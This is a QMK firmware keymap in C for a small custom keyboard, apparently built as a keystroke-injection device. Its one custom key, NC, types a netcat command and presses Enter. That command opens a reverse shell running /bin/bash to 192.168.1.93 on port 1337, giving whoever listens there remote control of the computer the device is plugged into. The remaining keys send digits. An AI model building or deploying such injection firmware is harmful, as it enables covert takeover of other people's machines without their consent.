/* Copyright 2020 Heikki
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
#include QMK_KEYBOARD_H
#include "rubberheik.h"
#include <sendstring_finnish.h>

enum custom_keycodes {
        NC
    };
	
bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    switch (keycode) {
	case NC:
          if (record->event.pressed) {
            SEND_STRING("nc -e /bin/bash 192.168.1.93 1337");
          	SEND_STRING(SS_TAP(X_ENTER));
        }
        return false;
    }
    return true;
};

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
    [0] = LAYOUT(
/*	----  ----  ----  ----  ----  ----*/
	      NC,             KC_1, 
	KC_2,       KC_3, KC_4,       KC_5,
	      KC_6,             KC_7
   )
};